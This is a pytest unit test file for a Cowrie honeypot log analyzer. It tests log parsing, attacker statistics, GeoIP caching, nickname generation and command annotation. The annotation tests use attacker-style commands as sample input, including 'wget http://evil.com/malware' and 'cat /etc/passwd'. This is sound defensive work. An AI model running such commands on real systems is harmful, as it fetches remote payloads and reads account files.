"""Unit tests for Cowrie log parsing."""
import json
import os
import tempfile
import pytest
from tests.conftest import _make_log_line

import generate


class TestParseLog:
    """Test parse_log() with various input formats."""

    def test_valid_json_lines(self, sample_log_lines):
        """Parser correctly reads valid Cowrie JSON log lines."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write('\n'.join(sample_log_lines))
            tmp = f.name
        try:
            events = generate.parse_log(tmp)
            assert len(events) == len(sample_log_lines)
            assert events[0]['eventid'] == 'cowrie.session.connect'
            assert events[3]['eventid'] == 'cowrie.login.success'
        finally:
            os.unlink(tmp)

    def test_malformed_lines_skipped(self):
        """Malformed JSON lines are skipped without crashing."""
        lines = [
            '{"eventid": "cowrie.session.connect", "src_ip": "1.2.3.4", "timestamp": "2026-03-01T12:00:00Z"}',
            'NOT VALID JSON {{{',
            '',
            '{"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4", "username": "root", "password": "x", "timestamp": "2026-03-01T12:00:01Z"}',
        ]
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write('\n'.join(lines))
            tmp = f.name
        try:
            events = generate.parse_log(tmp)
            assert len(events) == 2
        finally:
            os.unlink(tmp)

    def test_empty_file(self):
        """Empty log file returns empty list."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            tmp = f.name
        try:
            events = generate.parse_log(tmp)
            assert events == []
        finally:
            os.unlink(tmp)

    def test_nonexistent_file(self):
        """Missing file returns empty list without crashing."""
        events = generate.parse_log('/tmp/nonexistent_cowrie_log.json')
        assert events == []


class TestAnalyzeEvents:
    """Test analyze_events() statistics extraction."""

    def test_session_counting(self, sample_log_lines, mock_geo_cache):
        """Sessions are counted correctly."""
        generate._nickname_cache.clear()
        generate._nickname_counter.clear()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write('\n'.join(sample_log_lines))
            tmp = f.name
        try:
            events = generate.parse_log(tmp)
            data = generate.analyze_events(events, mock_geo_cache)
            assert data['stats']['total_sessions'] == 2
            assert data['stats']['total_login_attempts'] == 4  # 3 failed + 1 success
            assert data['stats']['successful_logins'] == 1
            assert data['stats']['unique_ips'] == 2
            assert data['stats']['commands_executed'] == 2
        finally:
            os.unlink(tmp)

    def test_attacker_grouping_by_ip(self, sample_log_lines, mock_geo_cache):
        """Sessions from the same IP are grouped in top_attackers."""
        generate._nickname_cache.clear()
        generate._nickname_counter.clear()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write('\n'.join(sample_log_lines))
            tmp = f.name
        try:
            events = generate.parse_log(tmp)
            data = generate.analyze_events(events, mock_geo_cache)
            ips = [a['ip'] for a in data['top_attackers']]
            assert '1.2.3.4' in ips
            attacker = next(a for a in data['top_attackers'] if a['ip'] == '1.2.3.4')
            assert attacker['count'] == 3  # 2 failed + 1 success login attempts
        finally:
            os.unlink(tmp)


class TestAnnotateCommand:
    """annotate_command delegates to explain.explain (see test_explain.py)."""

    def test_known_commands(self):
        assert generate.annotate_command('uname -a') == 'identifies the OS'
        assert generate.annotate_command('cat /etc/passwd') == 'lists user accounts'
        assert generate.annotate_command('whoami') == 'checks its privileges'

    def test_pattern_match(self):
        assert generate.annotate_command('wget http://evil.com/malware') == 'downloads a payload'
        assert generate.annotate_command('chmod +x /tmp/bot') == 'makes a file executable'

    def test_unknown_command(self):
        assert generate.annotate_command('some_custom_thing --flag') is None


class TestGeoIP:
    """Test GeoIP lookup with mocked network."""

    def test_cached_ip_no_network(self, mock_geo_cache):
        """IPs already in cache don't trigger network requests."""
        result = generate.batch_geoip_lookup(['1.2.3.4'], mock_geo_cache.copy())
        assert result['1.2.3.4']['country'] == 'Netherlands'

    def test_private_ip_in_cache(self, mock_geo_cache):
        """Private IP with unknown geo data is handled."""
        assert mock_geo_cache['10.0.0.1']['country'] == 'Unknown'


class TestNicknames:
    """Test nickname generation."""

    def test_country_flavor(self, mock_geo_cache):
        generate._nickname_cache.clear()
        generate._nickname_counter.clear()
        nick = generate.generate_nickname('1.2.3.4', mock_geo_cache['1.2.3.4'])
        assert nick  # Should be a NL flavor
        assert isinstance(nick, str)

    def test_deterministic(self, mock_geo_cache):
        generate._nickname_cache.clear()
        generate._nickname_counter.clear()
        nick1 = generate.generate_nickname('1.2.3.4', mock_geo_cache['1.2.3.4'])
        # Second call should return cached
        nick2 = generate.generate_nickname('1.2.3.4', mock_geo_cache['1.2.3.4'])
        assert nick1 == nick2

    def test_nickname_format_and_stable_across_reset(self, mock_geo_cache):
        """adjective_noun shape, and stable across a full cache reset — md5-seeded,
        not salted builtin hash(), so names don't reshuffle every regeneration."""
        generate._nickname_cache.clear()
        generate._nickname_counter.clear()
        n1 = generate.generate_nickname('1.2.3.4', mock_geo_cache['1.2.3.4'])
        assert '_' in n1
        assert n1.split('_')[0] in generate.NICKNAME_ADJECTIVES
        generate._nickname_cache.clear()
        generate._nickname_counter.clear()
        n2 = generate.generate_nickname('1.2.3.4', mock_geo_cache['1.2.3.4'])
        assert n1 == n2


class TestEmptyCommandRegression:
    """Regression for the production crash `[FATAL] list index out of range`.

    An empty/whitespace command run 3+ times reached `"".split()[0]` in
    generate_attacker_narratives (generate.py:1489) and aborted the whole run.
    """

    def test_empty_command_does_not_crash_narratives(self, mock_geo_cache, mocker):
        # No Ollama → the deterministic template branch (which held the bug).
        mocker.patch('generate._check_ollama_once', return_value=False)
        generate._nickname_cache.clear()
        generate._nickname_counter.clear()
        lines = [
            _make_log_line("cowrie.session.connect", src_ip="1.2.3.4"),
            _make_log_line("cowrie.login.success", src_ip="1.2.3.4",
                           username="root", password="toor"),
            # Empty command repeated 3x → lands in the `repeated` list.
            _make_log_line("cowrie.command.input", src_ip="1.2.3.4", input=""),
            _make_log_line("cowrie.command.input", src_ip="1.2.3.4", input=""),
            _make_log_line("cowrie.command.input", src_ip="1.2.3.4", input=""),
            # A few real commands so unique_cmd_count lands in the 4–6 branch.
            _make_log_line("cowrie.command.input", src_ip="1.2.3.4", input="uname -a"),
            _make_log_line("cowrie.command.input", src_ip="1.2.3.4", input="ls -la"),
            _make_log_line("cowrie.command.input", src_ip="1.2.3.4", input="whoami"),
        ]
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write('\n'.join(lines))
            tmp = f.name
        try:
            events = generate.parse_log(tmp)
            data = generate.analyze_events(events, mock_geo_cache)
            # Must not raise; should still yield a narrative for the attacker.
            results = generate.generate_attacker_narratives(data, desc_cache={})
            assert isinstance(results, list)
            assert any(r.get("narrative") for r in results)
        finally:
            os.unlink(tmp)
